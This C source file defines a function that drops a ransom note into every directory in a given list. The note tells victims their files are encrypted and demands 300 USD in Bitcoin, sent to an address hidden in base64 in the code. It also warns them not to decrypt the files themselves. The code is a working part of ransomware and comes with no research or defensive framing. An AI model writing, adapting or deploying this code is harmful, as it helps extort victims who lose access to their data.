#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>

void write_notice(const char **dirs, size_t n_dirs, const char *(*base64_decode)(const char *encoded)) {
    if (dirs == NULL || n_dirs == 0 || base64_decode == NULL) {
        return;
    }

    const char *filename = "#_STATUS_NOTICE_#.txt";
    const char *encoded_address = "MUExelAxZVA1UUdlZmkyRE1QVGZUTDVTUHY3RGl2Zk5h";
    const char *placeholder = "[ADDRESS DECODING FAILED]";

    for (size_t i = 0; i < n_dirs; i++) {
        const char *dir = dirs[i];
        if (dir == NULL) {
            continue;
        }

        size_t path_len = strlen(dir) + strlen(filename) + 2; /* +1 for '/' +1 for '\0' */
        char *filepath = (char *)malloc(path_len);
        if (filepath == NULL) {
            continue;
        }

        snprintf(filepath, path_len, "%s/%s", dir, filename);

        FILE *fp = fopen(filepath, "w");
        free(filepath);
        if (fp == NULL) {
            continue;
        }

        char *decoded_address = NULL;
        const char *address_to_use = placeholder;

        if (base64_decode != NULL) {
            decoded_address = (char *)base64_decode(encoded_address);
            if (decoded_address != NULL) {
                address_to_use = decoded_address;
            }
        }

        fprintf(fp,
            "ATTENTION: All your files have been encrypted.\n"
            "To regain access, you must pay a ransom of 300 USD to the following Bitcoin address:\n"
            "\n"
            "%s\n"
            "\n"
            "After payment, contact us via the secure channel provided in your payment confirmation.\n"
            "Do not attempt to decrypt the files yourself – you will lose them permanently.\n",
            address_to_use);

        if (decoded_address != NULL) {
            free(decoded_address);
        }

        fclose(fp);
    }
}